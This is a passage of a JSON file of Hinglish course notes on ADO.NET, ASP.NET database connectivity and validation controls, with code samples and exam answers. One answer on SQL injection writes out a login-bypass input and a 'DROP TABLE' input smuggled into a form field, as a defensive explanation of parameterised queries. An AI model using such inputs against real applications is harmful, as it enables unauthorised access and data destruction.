            "values": [
              "forward-only stream",
              "poora data memory mein copy"
            ]
          },
          {
            "label": "Speed",
            "values": [
              "fast, kam memory",
              "thoda slow (copy banti hai)"
            ]
          },
          {
            "label": "Multiple tables",
            "values": [
              "mushkil (NextResult)",
              "DataSet mein multiple DataTable"
            ]
          },
          {
            "label": "Best use",
            "values": [
              "simple read, bade data par loop",
              "grid bind, offline edit, web app"
            ]
          }
        ],
        "columnColors": [
          "#00d4ff",
          "#00e676"
        ]
      },
      {
        "type": "code",
        "title": "Connected model — SqlDataReader",
        "kicker": "Code",
        "code": "using System;\nusing System.Data.SqlClient;\n\npublic partial class Students : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        string cs = \"Data Source=.;Initial Catalog=College;\" +\n                    \"Integrated Security=True\";\n\n        using (SqlConnection con = new SqlConnection(cs))\n        {\n            con.Open();\n            using (SqlCommand cmd = new SqlCommand(\n                   \"SELECT Roll, Name FROM Student ORDER BY Roll\", con))\n            using (SqlDataReader rd = cmd.ExecuteReader())\n            {\n                lblResult.Text = \"\";\n                while (rd.Read())\n                {\n                    lblResult.Text += rd[\"Roll\"] + \" - \" +\n                                      rd[\"Name\"] + \"<br />\";\n                }\n            }\n        }   // using block connection band kar deta hai\n    }\n}",
        "language": "csharp",
        "filename": "Students.aspx.cs",
        "intro": "`ExecuteReader()` forward-only stream deta hai — `while (rd.Read())` se rows padho, `rd[\"column\"]` se value.",
        "note": "`using` block exception par bhi connection close karta hai — ye best practice hai."
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Disconnected model — DataAdapter aur GridView",
        "code": "using System;\nusing System.Data;\nusing System.Data.SqlClient;\n\npublic partial class Grid : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack) { Bind(); }\n    }\n\n    private void Bind()\n    {\n        string cs = System.Configuration\n            .ConfigurationManager.ConnectionStrings[\"College\"].ConnectionString;\n\n        DataTable dt = new DataTable();\n        using (SqlConnection con = new SqlConnection(cs))\n        using (SqlDataAdapter ad = new SqlDataAdapter(\n               \"SELECT Roll, Name, City FROM Student\", con))\n        {\n            ad.Fill(dt);          // connection khud khulta/band hota hai\n        }\n\n        gvStudent.DataSource = dt;\n        gvStudent.DataBind();\n    }\n}",
        "language": "csharp",
        "filename": "Grid.aspx.cs",
        "php": "Roll   Name    City\n21     Riya    Pune\n22     Aman    Delhi\n23     Neha    Mumbai\n\n(DataTable memory mein — connection pehle hi band)",
        "label": "Rendered output",
        "height": 230,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "`DataAdapter.Fill(dt)` data ki copy banata hai; grid ko copy bind karo — connection jaldi free."
      },
      {
        "type": "points",
        "title": "Zaroori baatein",
        "kicker": "Points",
        "points": [
          "**Providers:** `SqlClient` (SQL Server, fastest), `OleDb` (Access/Excel/any OLE DB), `Odbc`, `Oracle`.",
          "**Execute methods:** `ExecuteReader()` rows, `ExecuteNonQuery()` insert/update/delete (rows affected), `ExecuteScalar()` single value.",
          "**Stored procedures:** `cmd.CommandType = CommandType.StoredProcedure; cmd.Parameters.AddWithValue('@roll', 21);`",
          "**Connection pooling:** same connection string dobara use karne par pool se connection milta hai — string same rakho.",
          "**Web.config connection string:** `<connectionStrings><add name='College' connectionString='...' /></connectionStrings>`; `ConfigurationManager.ConnectionStrings['College']`.",
          "**Entity Framework / LINQ to SQL:** ADO.NET ke upar bane ORM — kam code, par ADO.NET ki samajh zaroori."
        ]
      },
      {
        "type": "diagram",
        "title": "ADO.NET Architecture",
        "kicker": "Diagram",
        "diagram": "wt4-adonet",
        "caption": "Connection → Command → DataReader (connected) ya DataAdapter → DataSet (disconnected)"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**ADO.NET:** `System.Data` classes; providers SqlClient/OleDb/Odbc.",
          "**Connected:** Connection + Command + DataReader — fast, forward-only, connection khula.",
          "**Disconnected:** DataAdapter + DataSet/DataTable — memory copy, connection jaldi band.",
          "**Execute methods:** ExecuteReader (rows), ExecuteNonQuery (insert/update/delete → rows affected), ExecuteScalar (single value).",
          "**DataSet:** multiple DataTable + relations, XML-serialisable, web services ke liye useful.",
          "**Best practice:** `using` block, parameterised queries, short connections."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain the ADO.NET architecture and its core objects.",
        "answer": "**ADO.NET** .NET Framework ka data access component hai (`System.Data`) jo application ko kisi bhi data source se jodta hai — connected aur disconnected dono tarike se.\n\n**Architecture (layers):**\n1. **Data Provider** — database-specific: `SqlClient` (SQL Server), `OleDb`, `Odbc`, `Oracle`.\n2. **Connected objects** — Connection, Command, DataReader.\n3. **Disconnected objects** — DataAdapter, DataSet, DataTable, DataView.\n4. **Consumers** — GridView/Repeater, Windows forms, web services, XML.\n\n**Core objects:**\n\n| Object | Kaam |\n|---|---|\n| **Connection** | database se link; `Open()`, `Close()` |\n| **Command** | SQL/stored procedure chalata hai |\n| **DataReader** | forward-only, read-only, connected stream |\n| **DataAdapter** | DataSet/DataTable fill karta hai, Update() se save |\n| **DataSet** | memory mein tables + relations (XML serialisable) |\n| **DataTable** | ek table ka memory copy |\n| **DataView** | DataTable ka sort/filter view |\n| **Transaction** | Commit/Rollback ke saath multiple commands |\n\n**Command ke 3 execute methods:**\n```csharp\ncmd.ExecuteReader();      // rows (SELECT)\ncmd.ExecuteNonQuery();    // insert/update/delete -> rows affected\ncmd.ExecuteScalar();      // single value (COUNT, MAX)\n```\n\n**Do models:** connected (fast, connection khula) vs disconnected (DataSet, connection band) — web apps mein disconnected pasand kiya jaata hai.\n\n**ADO.NET ke aage:** LINQ to SQL, Entity Framework, Dapper — sab isi ke upar bane hain.\n\n**Diagram:** Refer to the ADO.NET Architecture diagram."
      },
      {
        "question": "Differentiate between the connected and disconnected data access models in ADO.NET.",
        "answer": "ADO.NET do models deta hai — data par kaam karne ka tarika alag.\n\n| Point | Connected model | Disconnected model |\n|---|---|---|\n| Objects | Connection, Command, DataReader | DataAdapter, DataSet, DataTable |\n| Connection | poore kaam ke dauran khula | fill ke baad band |\n| Data | forward-only stream | poora data memory mein copy |\n| Speed | fast | thoda slow (copy + memory) |\n| Memory | kam | data ke size ke hisaab se |\n| Multiple tables | mushkil (NextResult) | haan (DataSet tables) |\n| Edit/update | seedha command se | DataSet edit → adapter.Update() |\n| Concurrency | connection hold | short connections, scalable |\n| Best use | simple read, bulk report | grid bind, offline edit, web apps |\n\n**Connected example:**\n```csharp\ncon.Open();\nSqlDataReader rd = cmd.ExecuteReader();\nwhile (rd.Read()) { /* rows */ }\ncon.Close();\n```\n\n**Disconnected example:**\n```csharp\nSqlDataAdapter ad = new SqlDataAdapter(\"SELECT * FROM Student\", con);\nDataTable dt = new DataTable();\nad.Fill(dt);            // connection automatically open/close\ngv.DataSource = dt;\n```\n\n**Kyun disconnected web apps ke liye:** hazaaron users ke liye connection khula rakhna possible nahi; ADO.NET connection pool ka pressure kam hota hai jab connection jaldi band ho.\n\n**Diagram:** Refer to the ADO.NET Architecture diagram."
      },
      {
        "question": "Compare DataReader and DataSet. When would you use each?",
        "answer": "Dono data padhne ke tarike hain, par ek stream hai aur doosra memory copy.\n\n| Point | DataReader | DataSet |\n|---|---|---|\n| Nature | forward-only, read-only stream | in-memory relational copy |\n| Connection | khula rehna zaroori | fill ke baad band |\n| Multiple tables | limited (NextResult) | haan (DataTable collection) |\n| Navigation | sirf aage | kisi bhi row par jump |\n| Sorting/filtering | SQL mein karo | DataView se |\n| Memory | kam | zyada |\n| Speed | fastest | slower |\n| Update | nahi (seedha command) | haan, DataAdapter.Update() |\n| Serialisation | nahi | XML mein ho sakta |\n| Best use | chhota/fast read, loop, report | grid bind, offline edit, multi-table, web service |\n\n**DataReader:**\n```csharp\nSqlDataReader rd = cmd.ExecuteReader();\nwhile (rd.Read()) { lbl.Text += rd[\"Name\"]; }\n```\n\n**DataSet:**\n```csharp\nSqlDataAdapter ad = new SqlDataAdapter(\"SELECT * FROM Student\", con);\nDataSet ds = new DataSet();\nad.Fill(ds, \"Student\");\ngv.DataSource = ds.Tables[\"Student\"];\ngv.DataBind();\n```\n\n**Rule:** sirf padhna hai aur aage badhna hai → **DataReader** (fast, less memory); bind karna hai, multiple tables chahiye, ya data par baad mein kaam → **DataSet/DataTable**.\n\n**Diagram:** Refer to the ADO.NET Architecture diagram."
      }
    ]
  },
  {
    "id": "db-connectivity",
    "number": "4.12",
    "title": "ASP.NET Database Connectivity",
    "subtitle": "Connection string se GridView tak — insert, select, bind",
    "icon": "plug",
    "accent": "#ff5252",
    "englishDefinition": "Database connectivity in ASP.NET means opening a connection to a database from a web page, executing SQL and showing or saving the result. The steps are: add the provider namespace (System.Data.SqlClient for SQL Server), store the connection string in Web.config's connectionStrings section, create a SqlConnection, create a SqlCommand with SQL text or a stored procedure, open the connection, execute the command (ExecuteNonQuery for INSERT/UPDATE/DELETE, ExecuteScalar for a single value, ExecuteReader for rows), bind the result to a server control such as GridView or read it in a loop, and close/dispose the connection inside a using block or try-catch-finally. Values coming from text boxes or query strings must be passed through SqlParameter objects rather than string concatenation, which prevents SQL injection, and the connection string must never be hard-coded in the page because it may contain credentials. Declarative data binding with SqlDataSource controls is an alternative to code-behind ADO.NET, and production applications often keep data-access code in a separate class (a DAL) rather than in the .aspx.cs file.",
    "intro": "Database connectivity ke **6 steps** yaad rakho: namespace → connection string → connection → command → execute → close (using block). Aur ek hi golden rule: user se aayi value **parameter** ke through bhejo, string jod kar SQL mat banao — warna **SQL injection**. Ye topic practical likhne ke liye hai: insert, select, GridView bind — exam mein code ke saath poochha jaata hai.",
    "sections": [
      {
        "type": "definition",
        "title": "Database connectivity kya hai",
        "kicker": "Steps",
        "body": "ASP.NET page se database tak ka safar: **connection string** (server, database, login) → **SqlConnection** → **SqlCommand** (SQL ya stored procedure) → **execute** → result ko GridView/Repeater par bind ya code mein padho → **connection close**.",
        "body2": "Connection string ko **Web.config** mein rakho (hard-code na karo), taaki server badalne par sirf ek jagah change karna pade. SQL mein user ki value **SqlParameter** se bhejo — ye SQL injection ka sabse seedha bachav hai.",
        "chips": [
          "Web.config connectionStrings",
          "SqlConnection",
          "SqlCommand",
          "SqlParameter",
          "using block"
        ]
      },
      {
        "type": "code",
        "title": "Step-by-step — INSERT with parameters",
        "kicker": "Code",
        "code": "using System;\nusing System.Configuration;\nusing System.Data.SqlClient;\n\npublic partial class AddStudent : System.Web.UI.Page\n{\n    private string cs =\n        ConfigurationManager.ConnectionStrings[\"College\"].ConnectionString;\n\n    protected void btnSave_Click(object sender, EventArgs e)\n    {\n        string sql = \"INSERT INTO Student (Roll, Name, City, Marks) \" +\n                     \"VALUES (@roll, @name, @city, @marks)\";\n\n        using (SqlConnection con = new SqlConnection(cs))\n        using (SqlCommand cmd = new SqlCommand(sql, con))\n        {\n            // parameters — SQL injection se bachav\n            cmd.Parameters.AddWithValue(\"@roll\",  int.Parse(txtRoll.Text));\n            cmd.Parameters.AddWithValue(\"@name\",  txtName.Text.Trim());\n            cmd.Parameters.AddWithValue(\"@city\",  ddlCity.SelectedValue);\n            cmd.Parameters.AddWithValue(\"@marks\", decimal.Parse(txtMarks.Text));\n\n            con.Open();\n            int rows = cmd.ExecuteNonQuery();   // affected rows\n            con.Close();\n\n            lblMsg.Text = rows > 0 ? \"Record saved!\" : \"Save failed\";\n        }\n    }\n}",
        "language": "csharp",
        "filename": "AddStudent.aspx.cs",
        "intro": "`ExecuteNonQuery()` insert/update/delete ke liye — return value affected rows hoti hai.",
        "note": "Web.config: `<connectionStrings><add name='College' connectionString='Data Source=.;Initial Catalog=College;Integrated Security=True' /></connectionStrings>`."
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "SELECT + GridView bind",
        "code": "using System;\nusing System.Configuration;\nusing System.Data;\nusing System.Data.SqlClient;\n\npublic partial class StudentList : System.Web.UI.Page\n{\n    protected void Page_Load(object sender, EventArgs e)\n    {\n        if (!IsPostBack) { LoadGrid(); }\n    }\n\n    private void LoadGrid()\n    {\n        string cs = ConfigurationManager.ConnectionStrings[\"College\"]\n                        .ConnectionString;\n\n        using (SqlConnection con = new SqlConnection(cs))\n        using (SqlCommand cmd = new SqlCommand(\n                 \"SELECT Roll, Name, City, Marks FROM Student ORDER BY Roll\", con))\n        {\n            con.Open();\n            gvStudent.DataSource = cmd.ExecuteReader();\n            gvStudent.DataBind();\n            con.Close();\n        }\n    }\n}",
        "language": "csharp",
        "filename": "StudentList.aspx.cs",
        "php": "Roll   Name    City     Marks\n21     Riya    Pune     88\n22     Aman    Delhi    76\n23     Neha    Mumbai   91\n\n[Refresh] par bhi wahi data (IsPostBack check)",
        "label": "Rendered output",
        "height": 230,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "GridView ko `DataSource` do aur `DataBind()` call karo — columns AutoGenerateColumns se khud ban jaate hain."
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Declarative tarika — SqlDataSource",
        "code": "<asp:GridView ID=\"gvStudent\" runat=\"server\"\n     DataSourceID=\"sdsStudent\" AutoGenerateColumns=\"true\" />\n\n<asp:SqlDataSource ID=\"sdsStudent\" runat=\"server\"\n     ConnectionString=\"<%$ ConnectionStrings:College %>\"\n     SelectCommand=\"SELECT Roll, Name, City, Marks FROM Student ORDER BY Roll\"\n     DeleteCommand=\"DELETE FROM Student WHERE Roll = @Roll\">\n</asp:SqlDataSource>",
        "language": "aspx",
        "filename": "StudentList.aspx",
        "php": "Browser mein wahi GridView table dikhta hai:\n\nRoll   Name    City     Marks\n21     Riya    Pune     88\n22     Aman    Delhi    76\n\n(kol code-behind 0 lines)",
        "label": "Rendered output",
        "height": 200,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Chhote pages ke liye SqlDataSource theek — sirf mark-up mein SQL; par bade project mein DAL/code-behind better."
      },
      {
        "type": "comparison",
        "title": "Data binding ke do tarike",
        "kicker": "Comparison",
        "columns": [
          "Code-behind (ADO.NET)",
          "SqlDataSource (declarative)"
        ],
        "rows": [
          {
            "label": "Kahan SQL",
            "values": [
              "code-behind (.aspx.cs)",
              ".aspx mark-up mein"
            ]
          },
          {
            "label": "Control",
            "values": [
              "poora (parameters, transaction)",
              "kam (built-in commands)"
            ]
          },
          {
            "label": "Testing",
            "values": [
              "alag class mein test ho sakta",
              "mushkil"
            ]
          },
          {
            "label": "Speed of dev",
            "values": [
              "medium",
              "fast (drag-drop)"
            ]
          },
          {
            "label": "Bade project",
            "values": [
              "recommended (DAL)",
              "avoid (SQL mark-up mein phail jaata hai)"
            ]
          }
        ],
        "columnColors": [
          "#00e676",
          "#ff8800"
        ]
      },
      {
        "type": "points",
        "title": "Best practices",
        "kicker": "Practices",
        "points": [
          "**Connection string Web.config mein** — page mein hard-code nahi; `ConfigurationManager` se padho.",
          "**`using` block** — exception par bhi connection close, connection pool free.",
          "**Parameterised queries** — `@param` + `AddWithValue`; string concat = SQL injection.",
          "**Zaroorat ke hisaab se column** — `SELECT *` se bacho, kam data = fast page.",
          "**try/catch** — DB error user ko na dikhao; log karo, friendly message do.",
          "**Stored procedure** — bade queries ke liye, `CommandType.StoredProcedure`.",
          "**DAL class** — data access ko alag class/library mein rakho, page code patla rahe."
        ]
      },
      {
        "type": "diagram",
        "title": "ASP.NET → ADO.NET → Database",
        "kicker": "Diagram",
        "diagram": "wt4-dbconnect",
        "caption": "Page → SqlConnection → SqlCommand → ExecuteReader/NonQuery → GridView / database"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Steps:** namespace → connection string (Web.config) → SqlConnection → SqlCommand → Open → execute → Close.",
          "**ExecuteNonQuery** insert/update/delete (rows affected), **ExecuteScalar** single value, **ExecuteReader** rows.",
          "**SqlParameter** se user value bhejo — SQL injection ka ilaaj.",
          "**GridView binding:** `DataSource = reader/DataTable`, phir `DataBind()`.",
          "**Declarative:** SqlDataSource mark-up mein SQL (chhote pages), warna DAL class.",
          "**Best practice:** using block, parameterised queries, try/catch, kam columns."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain the steps to connect an ASP.NET page to a SQL Server database and insert a record.",
        "answer": "Database connectivity ke steps:\n\n**1. Namespace** import karo:\n```csharp\nusing System.Data.SqlClient;\nusing System.Configuration;\n```\n\n**2. Connection string Web.config mein rakho:**\n```xml\n<connectionStrings>\n  <add name=\"College\"\n       connectionString=\"Data Source=.;Initial Catalog=College;Integrated Security=True\"\n       providerName=\"System.Data.SqlClient\" />\n</connectionStrings>\n```\n\n**3. Connection banao aur command ke saath jodo:**\n```csharp\nstring cs = ConfigurationManager.ConnectionStrings[\"College\"].ConnectionString;\n\nusing (SqlConnection con = new SqlConnection(cs))\nusing (SqlCommand cmd = new SqlCommand(\n        \"INSERT INTO Student(Roll,Name,City) VALUES(@r,@n,@c)\", con))\n{\n    cmd.Parameters.AddWithValue(\"@r\", int.Parse(txtRoll.Text));\n    cmd.Parameters.AddWithValue(\"@n\", txtName.Text);\n    cmd.Parameters.AddWithValue(\"@c\", ddlCity.SelectedValue);\n\n    con.Open();\n    int rows = cmd.ExecuteNonQuery();   // 1 = success\n    con.Close();\n    lblMsg.Text = rows > 0 ? \"Saved\" : \"Failed\";\n}\n```\n\n**4. Execute methods:**\n\n| Method | Use |\n|---|---|\n| `ExecuteNonQuery()` | INSERT/UPDATE/DELETE → rows affected |\n| `ExecuteScalar()` | single value (COUNT, MAX) |\n| `ExecuteReader()` | SELECT rows |\n\n**5. Connection close** — `using` block ya `finally` mein; warna pool khatam ho jaata hai.\n\n**6. Error handling** — try/catch, user ko technical error na dikhao.\n\n**Security:** parameters use karo, string concatenation nahi (SQL injection); connection string page mein hard-code na karo.\n\n**Diagram:** Refer to the ASP.NET → ADO.NET → Database diagram."
      },
      {
        "question": "How do you bind a database result to a GridView? Explain with code.",
        "answer": "GridView ko data dene ke do tarike hain — code-behind (ADO.NET) ya declarative (SqlDataSource).\n\n**A. Code-behind (recommended for real projects):**\n```csharp\nprivate void LoadGrid()\n{\n    string cs = ConfigurationManager.ConnectionStrings[\"College\"].ConnectionString;\n\n    using (SqlConnection con = new SqlConnection(cs))\n    using (SqlCommand cmd = new SqlCommand(\n             \"SELECT Roll, Name, City, Marks FROM Student\", con))\n    {\n        con.Open();\n        gvStudent.DataSource = cmd.ExecuteReader();\n        gvStudent.DataBind();\n        con.Close();\n    }\n}\n```\n- `Page_Load` mein `if (!IsPostBack) LoadGrid();` — warna har postback par rebind.\n\n**B. Disconnected (DataTable):**\n```csharp\nDataTable dt = new DataTable();\nusing (SqlDataAdapter ad = new SqlDataAdapter(sql, con)) { ad.Fill(dt); }\ngvStudent.DataSource = dt;\ngvStudent.DataBind();\n```\n\n**C. Declarative (SqlDataSource):**\n```html\n<asp:GridView ID=\"gvStudent\" runat=\"server\" DataSourceID=\"sdsStudent\" />\n<asp:SqlDataSource ID=\"sdsStudent\" runat=\"server\"\n    ConnectionString=\"<%$ ConnectionStrings:College %>\"\n    SelectCommand=\"SELECT * FROM Student\" />\n```\n\n**Important properties:** `AutoGenerateColumns`, `<Columns>` mein BoundField/TemplateField, `AllowPaging`, `AllowSorting`, `OnRowCommand`/`OnRowDeleting` for edit/delete.\n\n**Common mistakes:** `DataBind()` na call karna, postback par dobara bind karna, `SELECT *` (extra columns), connection open chhod dena.\n\n**Diagram:** Refer to the ASP.NET → ADO.NET → Database diagram."
      },
      {
        "question": "What is SQL injection? How does parameterised query prevent it in ASP.NET?",
        "answer": "**SQL injection** ek attack hai jismein user input ke andar SQL code daal kar query ka matlab badal diya jaata hai.\n\n**Vulnerable code (string concatenation):**\n```csharp\nstring sql = \"SELECT * FROM Users WHERE Name='\" + txtUser.Text + \"'\";\n```\nAgar user likhe: `' OR '1'='1` to query ban jaati hai:\n```sql\nSELECT * FROM Users WHERE Name='' OR '1'='1'\n```\n→ saare users mil jaate hain (login bypass). `'; DROP TABLE Users --` jaisa input table bhi uda sakta hai.\n\n**Parameterised query (safe):**\n```csharp\nstring sql = \"SELECT * FROM Users WHERE Name=@n AND Pass=@p\";\nusing (SqlCommand cmd = new SqlCommand(sql, con))\n{\n    cmd.Parameters.AddWithValue(\"@n\", txtUser.Text);\n    cmd.Parameters.AddWithValue(\"@p\", txtPass.Text);\n    con.Open();\n    object o = cmd.ExecuteScalar();   // sirf data, code nahi\n}\n```\n- `@n` ek **value slot** hai — andar `' OR '1'='1` aaye to wo plain text hi rehta hai, SQL nahi banta.\n- SQL Server query ko pehle parse karta hai, parameters baad mein bind hote hain → structure badal nahi sakta.\n\n**Aur bhi bachav:**\n- Stored procedures + parameters.\n- Input validation (length, type, allowed values) — `int.TryParse`.\n- Least privilege DB user (DROP/ALTER ke rights na do).\n- Error messages mein SQL na dikhao; parameterised `SqlDataSource` bhi safe.\n- ORM/EF use karo (parameters khud banti hain).\n\n**Note:** `AddWithValue` ke saath type/size dhyan rakho; bade text ke liye `SqlDbType.NVarChar, 100` specify karna better.\n\n**Diagram:** Refer to the ASP.NET → ADO.NET → Database diagram."
      }
    ]
  },
  {
    "id": "validation-controls",
    "number": "4.13",
    "title": "Validation Controls",
    "subtitle": "RequiredField, Range, Compare, RegularExpression, ValidationSummary",
    "icon": "check",
    "accent": "#aa00ff",
    "englishDefinition": "Validation controls are ASP.NET server controls that check user input before the page is processed, showing an error message next to the offending field. RequiredFieldValidator ensures a control is not left empty; RangeValidator checks that a value lies between MinimumValue and MaximumValue for the given Type (Integer, Double, Date, String, Currency); CompareValidator compares the input with a fixed ValueToCompare, with another control (ControlToCompare) using Operator (Equal, NotEqual, GreaterThan, LessThan, DataTypeCheck) and optionally checks data type; RegularExpressionValidator matches a pattern such as an email or PIN code; CustomValidator runs user-written client and/or server validation logic; and ValidationSummary collects all error messages in one place (list, bullet list or single paragraph) optionally as a popup. Every validator uses ControlToValidate, ErrorMessage, Text, Display, ForeColor, ValidationGroup and SetFocusOnError, supports client-side JavaScript when EnableClientScript is true, and always runs on the server; a page with validators sets Page.IsValid, which must be checked in the event handler because client script can be bypassed. A RangeValidator with an empty field passes unless a RequiredFieldValidator is also present, and validators can be grouped so that only the relevant group runs for a given button.",
    "intro": "Validation controls user ka input **bhejne se pehle** check karte hain — aur error message usi field ke paas dikhate hain. Paanch types: **RequiredField** (khaali na ho), **Range** (min–max), **Compare** (doosre field ya fixed value se compare), **RegularExpression** (email/pattern), **Custom** (apna logic) — aur **ValidationSummary** saare errors ek jagah. Sabse important baat: client-side script bypass ho sakta hai, isliye server par **`Page.IsValid`** check karna zaroori hai.",
    "sections": [
      {
        "type": "definition",
        "title": "Validation controls kya hain",
        "kicker": "Definition",
        "body": "Validation control ek server control hai jo doosre control ki value check karta hai. Galat ya khaali value par page process nahi hota aur `ErrorMessage`/`Text` dikhta hai. Har validator ka `ControlToValidate` batata hai kaun sa input check karna hai.",
        "body2": "Do layer par check hota hai: **client-side** (`EnableClientScript='true'`, JavaScript se, turant feedback) aur **server-side** (hamesha chalta hai, `Page.IsValid`) — server wala security ke liye zaroori hai kyunki JavaScript band ho sakta hai.",
        "chips": [
          "ControlToValidate",
          "ErrorMessage",
          "Client + server",
          "Page.IsValid",
          "ValidationGroup"
        ]
      },
      {
        "type": "codeoutput",
        "kicker": "Code + Output",
        "title": "Teen main validators — page aur output",
        "code": "<form id=\"form1\" runat=\"server\">\n  Name:\n  <asp:TextBox ID=\"txtName\" runat=\"server\" />\n  <asp:RequiredFieldValidator ID=\"rfvName\" runat=\"server\"\n       ControlToValidate=\"txtName\" ForeColor=\"Red\"\n       ErrorMessage=\"Name is required\" Text=\"*\" /><br />\n\n  Age:\n  <asp:TextBox ID=\"txtAge\" runat=\"server\" />\n  <asp:RangeValidator ID=\"rvAge\" runat=\"server\"\n       ControlToValidate=\"txtAge\" Type=\"Integer\"\n       MinimumValue=\"18\" MaximumValue=\"60\" ForeColor=\"Red\"\n       ErrorMessage=\"Age must be 18-60\" Text=\"*\" /><br />\n\n  Password:\n  <asp:TextBox ID=\"txtPass\" runat=\"server\" TextMode=\"Password\" />\n  Confirm:\n  <asp:TextBox ID=\"txtConfirm\" runat=\"server\" TextMode=\"Password\" />\n  <asp:CompareValidator ID=\"cvPass\" runat=\"server\"\n       ControlToValidate=\"txtConfirm\" ControlToCompare=\"txtPass\"\n       Operator=\"Equal\" ForeColor=\"Red\"\n       ErrorMessage=\"Passwords do not match\" Text=\"*\" /><br />\n\n  <asp:Button ID=\"btnSave\" runat=\"server\" Text=\"Save\"\n       OnClick=\"btnSave_Click\" CausesValidation=\"true\" />\n</form>",
        "language": "aspx",
        "filename": "Register.aspx",
        "php": "Name: [        ] *          <- khaali chhoda\nAge:  [  12  ] *              <- 18 se kam\nConfirm: [ abc ] *            <- password se match nahi\n\n(Page submit nahi hua; * ke saath red message\n - \"Name is required\"\n - \"Age must be 18-60\"\n - \"Passwords do not match\")",
        "label": "Rendered output",
        "height": 210,
        "outputHint": "ASP.NET · rendered output",
        "outputNote": "ASP.NET server par compile hota hai — browser ko sirf rendered HTML milta hai.",
        "intro": "Teeno validators `Text='*'` dikhate hain aur `ErrorMessage` ValidationSummary ke liye rakhta hai."
      },
      {
        "type": "comparison",
        "title": "RequiredField vs Range vs Compare",
        "kicker": "Comparison",
        "columns": [
          "RequiredFieldValidator",
          "RangeValidator",
          "CompareValidator"
        ],
        "rows": [
          {
            "label": "Check karta",
            "values": [
              "field khaali na ho",
              "value min–max ke beech",
              "do value barabar/size"
            ]
          },
          {
            "label": "Main properties",
            "values": [
              "ControlToValidate, InitialValue",
              "MinimumValue, MaximumValue, Type",
              "ControlToCompare / ValueToCompare, Operator, Type"
            ]
          },
          {
            "label": "Operator",
            "values": [
              "—",
              "—",
              "Equal, NotEqual, GreaterThan, LessThan, DataTypeCheck"
            ]
          },
          {
            "label": "Type",
            "values": [
              "—",
              "Integer, Double, Date, String, Currency",
              "Integer, String, Date..."
            ]
          },
          {
            "label": "Khaali field",
            "values": [
              "error (yahi kaam)",
              "pass ho jaata hai",
              "pass ho jaata hai"
            ]
          },
          {
            "label": "Example",
            "values": [
              "name/email zaroori",
              "age 18–60, marks 0–100",
              "password confirm, date compare"
            ]
          }
        ],
        "columnColors": [
          "#ff5252",
          "#ff8800",
          "#00d4ff"
        ]
      },
      {
        "type": "code",
        "title": "ValidationSummary, ValidationGroup aur server check",
        "kicker": "Code",
        "code": "<!-- Summary + groups -->\n<asp:ValidationSummary ID=\"vsAll\" runat=\"server\"\n     HeaderText=\"Please fix these errors:\"\n     ShowMessageBox=\"false\" ShowSummary=\"true\" ForeColor=\"Red\" />\n\n<asp:TextBox ID=\"txtEmail\" runat=\"server\" ValidationGroup=\"mail\" />\n<asp:RegularExpressionValidator ID=\"revMail\" runat=\"server\"\n     ControlToValidate=\"txtEmail\" ValidationGroup=\"mail\"\n     ValidationExpression=\"^[\\w.+-]+@[\\w-]+\\.[\\w.]+$\"\n     ErrorMessage=\"Invalid email\" Text=\"*\" />\n<asp:Button ID=\"btnMail\" runat=\"server\" Text=\"Subscribe\"\n     ValidationGroup=\"mail\" />\n\n<!-- Code-behind: server par hamesha check -->\nprotected void btnSave_Click(object sender, EventArgs e)\n{\n    if (!Page.IsValid) { return; }   // client script bypass ho to bhi safe\n\n    // ab save karo\n    lblMsg.Text = \"Saved: \" + txtName.Text;\n}",
        "language": "csharp",
        "filename": "Register.aspx.cs",
        "intro": "ValidationGroup se sirf ek button ke controls validate hote hain — baaki form par asar nahi.",
        "note": "`CausesValidation='false'` cancel/reset button par lagao, warna wo bhi validate karega."
      },
      {
        "type": "points",
        "title": "Properties aur best practices",
        "kicker": "Properties",
        "points": [
          "**`ControlToValidate`** — kaun sa control check karna (ek validator ek control).",
          "**`Text` vs `ErrorMessage`** — Text control ke paas dikhta hai, ErrorMessage ValidationSummary mein.",
          "**`Display`** — Static (jagah reserve), Dynamic (jagah sirf error par), None (sirf summary mein).",
          "**`Type` (Range/Compare)** — Integer, Double, Date, Currency, String — galat type bhi error deta hai.",
          "**`Operator` (Compare)** — Equal, NotEqual, GreaterThan, GreaterThanEqual, LessThan, LessThanEqual, DataTypeCheck.",
          "**`Operator=DataTypeCheck`** — sirf type check karta hai (jaise age number hona chahiye).",
          "**Khaali field trap:** Range/Compare khaali field ko valid maan lete hain — RequiredFieldValidator alag lagao.",
          "**Server par `Page.IsValid`** hamesha check karo — client-side bypass ho sakta hai."
        ]
      },
      {
        "type": "diagram",
        "title": "Validation Controls Flow",
        "kicker": "Diagram",
        "diagram": "wt4-validation",
        "caption": "Input → client-side check → server-side check (Page.IsValid) → save; error par message + summary"
      },
      {
        "type": "recap",
        "title": "Recap",
        "kicker": "Revise",
        "points": [
          "**Validation controls:** RequiredField, Range, Compare, RegularExpression, Custom, ValidationSummary.",
          "**Common properties:** ControlToValidate, ErrorMessage, Text, Display, ValidationGroup, ForeColor.",
          "**RequiredField:** khaali field; **Range:** min–max + Type; **Compare:** do value + Operator.",
          "**Client + server:** EnableClientScript se turant feedback, `Page.IsValid` se server security.",
          "**ValidationGroup:** sirf ek button ke validators; `CausesValidation='false'` cancel button par.",
          "**Trap:** Range/Compare khaali field pass karte hain — RequiredField alag lagao."
        ]
      }
    ],
    "examQuestions": [
      {
        "question": "Explain the validation controls in ASP.NET with suitable examples.",
